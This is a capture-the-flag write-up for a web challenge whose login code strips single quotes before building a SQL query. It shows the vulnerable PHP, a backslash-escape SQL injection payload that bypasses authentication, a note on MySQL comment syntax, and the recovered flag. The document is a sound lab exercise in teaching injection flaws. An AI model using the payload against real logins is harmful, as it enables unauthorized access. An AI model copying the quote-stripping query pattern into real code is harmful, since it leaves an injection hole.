## bypass the world  

### The Problem:

> I Don't Care if the world is against you, but i believe that you can bypass the world  (http://35.197.254.240/bypassworld/)

### The Solution:

- Using the hint, it seems some lousy filter is replacing/deleting the single quote char inserted by user. The Challenge would be escaping the single quotes written in the original code.  
```
$name = preg_replace('/\'/', '', $name);
$pass = preg_replace('/\'/', '', $pass);

$query = "SELECT * FROM users where name = '$name' and password = '$pass'"
```
- Username field `blabla\`, password field `or 1 = 1; -- `

`$query = "SELECT * FROM users where name = 'blabla\' and password = 'or 1 = 1; -- $pass'"`

- Note: the space after the double dash is essential for MySQL!
  
  > The double dash-comment style requires at least whitespace or control character (space, tab, newline, etc) after the second dash. Note that standard SQL does not require a whitespace after the second dash. MySQL uses a whitespace to avoid the problems with some SQL construct... etc.


### The flag: 
`FLAG{Y0u_Ar3_S0_C00L_T0d4y}`

### Notes:
- CWE-89.
- OWASP top 10 `A1-Injection`.



